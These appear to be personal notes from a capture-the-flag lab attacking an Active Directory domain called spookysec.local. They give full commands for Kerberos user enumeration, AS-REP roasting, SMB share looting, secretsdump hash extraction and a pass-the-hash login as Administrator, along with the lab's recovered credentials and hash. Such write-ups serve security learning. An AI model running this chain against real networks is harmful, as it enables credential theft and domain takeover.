Initial enumeration, amazingly executed by goHeartBleed, found open ports

sadly nmap is a far better tool:

Can see the domain name and the .local TLD

using my new knowledge of enumerating the domain, can use kerbrute to find cool users
	kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/AD_THM/userlist.txt
interesting users
	svc-admin
	administrator
	backup

have usernames now trying to do ASREP roasting
	fuck me im gonna have to use impacket
	occurs when a user has the privilege "Does not require Pre-Authentication"
	Very nice sample command
		root@kali:/impacket/examples/> python GetNPUsers.py testAD.local/ -usersfile users.txt -format hashcat -outputfile hashes.testAD
			I need to use python2, idk why

password for svc-admin cracked
	svc-admin:management2005

Remeber to look at the type of the hash to find out which mode to use!!

now we have user creds and are spraying the AD
	smbclient -L spookysec.local -U svc-admin
Notes on smbclient
	need to give a full address to interact
		smbclient '\\spookysec.local\backup' -U svc-admin
	used to connect to shares
	when connected use mget to download a file

In the backup creds file, b64 decode to get:
	backup@spookysec.local:backup2517860

python2 secretsdump.py spookysec.local/backup:backup2517860@spookysec.local
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

With the hash of the admin, can conncet using the hash (no password needed)

evil-winrm -i MACHINE_IP -u Administrator -H THEFOUNDHASH

	evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
